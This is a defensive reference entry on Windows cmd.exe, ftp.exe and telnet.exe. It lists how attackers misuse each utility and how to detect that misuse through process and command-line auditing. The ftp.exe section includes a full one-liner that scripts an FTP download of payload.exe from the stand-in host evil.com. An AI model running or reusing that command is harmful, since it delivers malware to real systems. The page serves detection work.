# cmd.exe / ftp.exe / telnet.exe — Legacy Built-in Utilities

## cmd.exe — Windows Command Processor

### Description
The Windows command shell. Attackers use cmd.exe to execute commands, run scripts, launch tools, and create batch files.

### Suspicious Usage
- cmd.exe spawned by non-standard parents (Office, browser, PDF reader)
- cmd.exe chaining multiple commands via `&`, `&&`, or `|`
- Encoded or obfuscated batch commands
- cmd.exe used for persistence via schtasks or Run keys

### Detection
- Event ID 4688 / Sysmon 1 for process creation
- Parent-child relationship analysis
- Command-line auditing for suspicious patterns

## ftp.exe — File Transfer Protocol

### Description
Built-in FTP client available on Windows. Attackers can use ftp.exe to download or exfiltrate files over FTP protocol.

### Suspicious Usage
```
echo open evil.com>script&echo user anonymous pass>>script&echo get payload.exe>>script&echo quit>>script&ftp -s:script
```

### Detection
- ftp.exe execution with scripts (`-s:filename`)
- FTP connections to non-corporate IPs on port 21
- Script files in Temp directories containing FTP commands

## telnet.exe — Telnet

### Description
Legacy telnet client. Available on some Windows systems. Can be used for interactive shell access or C2 communication.

### Suspicious Usage
- Outbound telnet connections on port 23 from internal hosts
- telnet used for manual command execution on remote systems
- telnet.exe running on systems where telnet is not needed for administration

## Detection Flags (All)
- Event ID 4688/Sysmon 1 for process execution
- Command-line argument auditing
- Network connections from legacy utilities to unknown destinations
- Script files in user-writable directories referencing these utilities
